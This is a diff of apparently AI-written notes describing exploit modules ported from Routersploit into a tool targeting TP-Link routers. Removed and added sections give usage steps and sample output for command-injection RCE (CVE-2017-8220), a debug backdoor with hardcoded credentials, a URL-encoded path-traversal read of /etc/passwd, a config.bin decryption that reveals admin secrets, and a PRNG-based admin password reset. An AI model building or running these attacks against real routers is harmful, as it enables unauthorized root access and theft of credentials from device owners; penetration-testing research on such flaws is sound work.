@@ -1030,68 +1030,6 @@ All modules verified to compile cleanly. Tested against mock scenarios (theoreti
 
 
 
-
-
-
-
-
-
-
-TP-Link Routersploit Modules Walkthrough
-This update adds 3 modules ported from the Routersploit framework, targeting common TP-Link vulnerabilities.
-
-1. Archer C2/C20i Remote Code Execution (CVE-2017-8220)
-Authenticated RCE using command injection in the 
-host
- parameter.
-
-Original Module: archer_c2_c20i_rce.py
-Target: /cgi?2
-Usage
-Select Module: exploits/tplink/tplink_archer_c2_c20i_rce
-target: <target_ip>
-Command to execute [uname -a]: uname -a
-[*] Sending injection payload...
-[*] Triggering execution...
-[+] Exploit triggered successfully (Blind RCE).
-[*] If the command was interactive (like execution), you won't see output here.
-2. WDR740N Debug Backdoor
-Exploits a debug page (DebugResultRpm.htm) that allows command execution with hardcoded credentials (osteam / 5up).
-
-Original Module: wdr740nd_wdr740n_backdoor.py
-Target: /userRpm/DebugResultRpm.htm
-Usage
-Select Module: exploits/tplink/tplink_wdr740n_backdoor
-target: <target_ip>
-Command to execute [uname -a]: id
-[*] Sending exploit request...
-[+] Request successful!
-[+] Command Output:
-uid=0(root) gid=0(root)
-3. WDR740N Path Traversal
-Unauthenticated arbitrary file read using path traversal (../).
-
-Original Module: wdr740nd_wdr740n_path_traversal.py
-Target: /help/
-Usage
-Select Module: exploits/tplink/tplink_wdr740n_path_traversal
-target: <target_ip>
-File to read [/etc/shadow]: /etc/passwd
-[*] Target: http://192.168.1.1
-[*] Using URL-encoded dots to bypass local normalization...
-[*] URL: http://192.168.1.1/help/%2e%2e/%2e%2e/.../etc/passwd
-[+] Request successful!
-[+] File Content (/etc/passwd):
-root:x:0:0:root:/root:/bin/sh
-...
-Verification
-Modules compiled successfully. Logic follows Routersploit implementations 1:1, including headers, payloads, and specific credential usage.
-
-
-
-
-
-
 I have implemented the 3 requested TP-Link modules ported from Routersploit:
 
 Archer C2/C20i RCE (CVE-2017-8220): 1:1 port using the [IPPING_DIAG...] payload.
@@ -1189,6 +1127,10 @@ build.rs now uses walkdir for robust scanning and generates AVAILABLE_MODULES co
 module discovery is now instant (compile-time constant) rather than runtime directory scanning.
 verified that the project compiles cleanly (fixed unused imports and definition errors).
 The system is now more reliable and stable as requested.
+
+
+
+
 
 
 
@@ -1342,3 +1284,38 @@ target: <exim_ip>
 
 
 
+
+
+
+TP-Link WDR842N & Archer C9 Modules
+Two new modules have been ported from Routersploit targetting TP-Link routers.
+
+1. TP-Link WDR842ND/WDR842N Configuration Disclosure
+Module: exploits/tplink/tplink_wdr842n_configure_disclosure
+Vuln: Configuration Disclosure (CVE-2015-XXXX)
+Target: /config.bin (Default Port 80)
+Functionality: Downloads and decrypts the router configuration file to reveal the admin password, authKey, and other secrets.
+Select Module: exploits/tplink/tplink_wdr842n_configure_disclosure
+target: <ip>
+[*] Downloading config from http://192.168.0.1:80/config.bin
+[*] Config downloaded (16384 bytes). Decrypting...
+[+] Found cPskSecret: secret123
+[+] Found cUsrPIN: 12345678
+[+] Found authKey: RDpbLfCPsJZ7fiv
+[+] Decoded Password:
+admin
+
+2. TP-Link Archer C9/C60 Password Reset
+Module: exploits/tplink/tplink_archer_c9_password_reset
+Vuln: Predictable PRNG (CVE-2017-11519)
+Target: /cgi-bin/luci/;stok=/login?form=vercode
+Functionality: Exploits weak PRNG seeded with server time to brute-force the password reset verification code and reset the admin password.
+Select Module: exploits/tplink/tplink_archer_c9_password_reset
+target: <ip>
+[*] Getting server time...
+[+] Server Time: Fri, 21 Jul 2017 18:30:00 GMT (TS: 1500661800)
+[*] Triggering reset code generation...
+[*] Guessing reset code (Time window: +5s)...
+[*] Trying code 123456 (Seed: 1500661800)
+...
+[+] Success! Admin password reset verified.
